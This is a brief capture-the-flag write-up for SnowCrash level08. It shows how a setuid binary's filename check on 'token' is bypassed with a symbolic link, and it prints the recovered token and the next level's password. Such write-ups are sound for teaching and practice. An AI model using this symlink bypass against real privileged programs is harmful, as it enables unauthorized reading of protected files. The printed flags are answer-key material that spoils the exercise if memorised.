when we login as level08 user we are given 2 files :

level08@SnowCrash:~$ ls -l
total 16
-rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
-rw-------  1 flag08 flag08    26 Mar  5  2016 token

We can not tead the file token and i suppose the flag is hidden in this file and we have to find a way to read it.

when we execute the binary file level08 we get : 

level08@SnowCrash:~$ ./level08 
./level08 [file to read]

If we provide the token file to this binary it doens'nt want to read it, it seems it verify if the file name is token, if so then do not read it :

level08@SnowCrash:~$ ./level08 token
You may not access 'token'
level08@SnowCrash:~$ ./level08 "token asdjha as j"
You may not access 'token asdjha as j'

All we need to do is change the file name to something that do not contain the word token and to do this we can create a symbolik link :

level08@SnowCrash:~$ ln -s /home/user/level08/token /tmp/maflag


And now we can execute the program again with the new name :

level08@SnowCrash:~$ ./level08 /tmp/maflag
quif5eloekouj29ke0vouxean

We have to log into the flag08 account to get the password for the next lavel

So the Password to connect to the account level09 is : 25749xKZ8L7DkSCwJkT9dyv6f
